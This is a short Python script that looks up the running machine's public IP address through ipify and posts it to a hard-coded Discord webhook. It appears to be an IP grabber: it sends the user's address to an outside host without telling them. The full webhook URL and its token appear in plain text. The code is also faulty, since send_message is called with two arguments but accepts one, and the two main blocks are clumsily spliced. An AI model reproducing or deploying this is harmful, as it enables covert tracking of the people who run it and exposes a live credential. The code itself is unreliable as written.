import requests

def get_public_ip():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        resp.raise_for_status()
        return resp.json().get("ip")
    except Exception as e:
        raise RuntimeError(f"Nie udało się pobrać IP: {e}")

if __name__ == "__main__":
    ip = get_public_ip()
    

WEBHOOK_URL = "https://discord.com/api/webhooks/1418597405871439933/8YsY9-WYZfq19AHicu8ua8ZPWgVxS1_I-4CiQ-LtZLS5HtzPfHOW8dpBwdrh84Pm80NR"

def send_message(content: str):
    data = {"content": content}
    resp = requests.post(WEBHOOK_URL, json=data)
    

if __name__ == "__main__":
    send_message('IP recived: ', ip)
